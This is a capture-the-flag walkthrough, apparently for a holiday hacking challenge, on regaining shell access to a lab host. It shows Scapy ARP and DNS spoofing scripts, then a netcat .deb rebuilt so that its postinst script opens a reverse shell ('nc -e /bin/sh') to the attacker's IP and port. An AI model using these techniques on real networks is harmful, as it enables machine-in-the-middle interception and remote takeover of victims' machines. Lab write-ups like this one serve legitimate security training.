@@ -1,0 +1,179 @@
+In-game terminal
+Objective: Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
+Hints:
+  Malware on host at 10.6.6.35, sniff eth0 using tcpdump -nni eth0 to find traffic from host.
+  https://www.tcpdump.org/manpages/pcap-filter.7.html
+  Host making ARP requests. Machine-in-the-middle attack with /home/guest/scripts.
+  Host does a DNS request after ARP, resolve it with our IP.
+  Host does a HTTP request for a .deb package. Get CLI access with a customized .deb file.
+  https://www.makeuseof.com/how-deb-packages-are-backdoored-how-to-detect-it/
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+  Switch terminal panel with Ctrl+B => arrow keys or o
+  Resize panel with Ctrl+B => Ctrl+Up or Ctrl+Down
+
+
+(Initial message)
+  Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
+  Help the North Pole by getting command line access back to this host.
+
+  Read the HELP.md file for information to help you in this endeavor.
+
+  Note: The terminal lifetime expires after 30 or more minutes so be 
+  sure to copy off any essential work you have done as you go.
+
+
+(Let's look for the ARP requests.)
+~$ tcpdump -nni eth0
+  tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+  listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+  02:49:30.081090 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+  02:49:31.113014 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+  02:49:32.145101 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+  ...
+
+
+(tshark will show the MAC address. Or use -e with tcpdump.)
+$ tshark -ni eth0
+  Capturing on 'eth0'
+    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    2 1.035716198 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    3 2.071726872 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    ...
+
+
+(Example of a ARP reply from the ScapyPrepper challenge: https://www.cloudshark.org/captures/e4d6ea732135)
+(Update the ARP spoofing script.)
+~$ nano ./scripts/arp_resp.py
+  ...
+  ether_resp = Ether(dst="4c:24:57:ab:ed:84", type=0x806, src=macaddr)
+
+  arp_response = ARP(pdst="4c:24:57:ab:ed:84")
+  arp_response.op = 2          #reply
+  arp_response.plen = 4        #Protocol size
+  arp_response.hwlen = 6       #Hardware size
+  arp_response.ptype = 0x0800  #IPv4
+  arp_response.hwtype = 1      #Ethernet
+
+  arp_response.hwsrc = macaddr              #own MAC addr
+  arp_response.psrc = "10.6.6.53"           #spoofed IP
+  arp_response.hwdst = "4c:24:57:ab:ed:84"  #target MAC addr
+  arp_response.pdst = "10.6.6.35"           #target IP addr
+  ...
+
+
+(Run tcpdump and filter out the ARP broadcasting packets.)
+~$ tcpdump -nei eth0 not ether dst ff:ff:ff:ff:ff:ff
+
+
+(Run the script to send the packet on a different terminal panel.)
+~$ ./scripts/arp_resp.py
+  .
+  Sent 1 packets.
+
+
+(Line 1 is the ARP reply and line 2 is the subsequent DNS query to port 53.)
+  02:42:0a:06:00:02 > 4c:24:57:ab:ed:84, ethertype ARP (0x0806), length 42: Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
+  4c:24:57:ab:ed:84 > 02:42:0a:06:00:02, ethertype IPv4 (0x0800), length 74: 10.6.6.35.11295 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
+
+
+(Example of a DNS PCAP: https://www.cloudshark.org/captures/0320b9b57d35)
+(Update the ARP spoofing script.)
+~$ nano ./scripts/dns_resp.py
+  ...
+  # destination ip we arp spoofed
+  ipaddr_we_arp_spoofed = "10.6.6.53"
+
+  def handle_dns_request(packet):
+      # Need to change mac addresses, Ip Addresses, and ports below.
+      # We also need
+      eth = Ether(src="02:42:0a:06:00:02", dst="4c:24:57:ab:ed:84")  #src=own, dst=target
+      ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)           #src=spoof,dst=target
+      udp = UDP(dport=packet[UDP].sport, sport=53)                   #src=spoof,dst=target
+      dns = DNS(
+          # MISSING DNS RESPONSE LAYER VALUES
+          id=packet[DNS].id,  #Transaction ID
+          qr=1,               #FlagBit1, 1 = response
+          opcode="QUERY",     #Standard Query = 0000
+          rd=1,               #Recursion desired
+          ra=1,               #Recursion available
+          rcode="ok",         #Replycode, 0 = no error
+          qdcount=1,          #Query count
+          ancount=1,          #Answer count
+          qd=DNSQR(qname='ftp.osuosl.org',qtype="A",qclass="IN"),
+          an=DNSRR(rrname='ftp.osuosl.org',rdata=ipaddr,type="A",rclass="IN")
+      )
+  ...
+
+
+(From the hints, target does ARP request, then DNS request, then HTTP request.)
+(Using all 3 panels: we start a HTTP server on 1, start the DNS script on another to intercept the DNS request, and finally launch the arp spoofing script on the 3rd to trigger the DNS request.)
+~$ python3 -m http.server 80
+~$ ./scripts/dns_resp.py
+~$ ./scripts/arp_resp.py
+
+
+(The HTTP server would then receive a GET request.)
+10.6.6.35 - - [<time>] code 404, message File not found
+10.6.6.35 - - [<time>] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
+
+
+(Refers to armor a .deb file with a backdoor.)
+  https://www.youtube.com/watch?v=ep88vVfzDAo
+  https://www.makeuseof.com/how-deb-packages-are-backdoored-how-to-detect-it/
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+(Go to the deb/ directory and unpack a .deb file.)
+~$ cd debs
+~$ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb nc
+
+
+(Go to the control directory and update the postint script.)
+~$ cd nc/DEBIAN/
+~$ nano postinst
+
+
+(Add the backdoor string under the #!/bin/sh)
+nc -e /bin/sh 10.6.0.2 23456
+
+
+(Save, backup, and build the package.)
+~$ cd ../../
+~$ dpkg-deb --build nc suriv_amd64.deb
+~$ cd ../
+
+
+(Create the directory jack is looking for move the package there.)
+~$ mkdir ./pub/
+~$ mkdir ./pub/jfrost/
+~$ mkdir ./pub/jfrost/backdoor/
+~$ cp ./debs/suriv_amd64.deb ./pub/jfrost/backdoor/suriv_amd64.deb
+
+
+(Start listening on port 23456 on 1 panel.)
+~$ nc -nvlp 23456
+
+
+(With web server still runing, retrigger DNS and ARP scripts.)
+(DNS script in the background so they can be on 1 panel.)
+~$ ./scripts/dns_resp.py &
+~$ ./scripts/arp_resp.py
+
+
+(Connected!! List the directories.)
+~$ ls -al | head
+  drwxr-xr-x   1 root root 4096 Oct 19 11:00 .
+  drwxr-xr-x   1 root root 4096 Oct 19 11:00 ..
+  -rwxr-xr-x   1 root root    0 Oct 19 11:00 .dockerenv
+  -rw-r--r--   1 root root 3618 Sep 20  2021 NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+  lrwxrwxrwx   1 root root    7 Sep 21  2021 bin -> usr/bin
+  ...
+
+
+(grep for "recuse")
+~$ grep recuse NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+  ...
+  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.
+
+
+Answer: Tanta Kringle
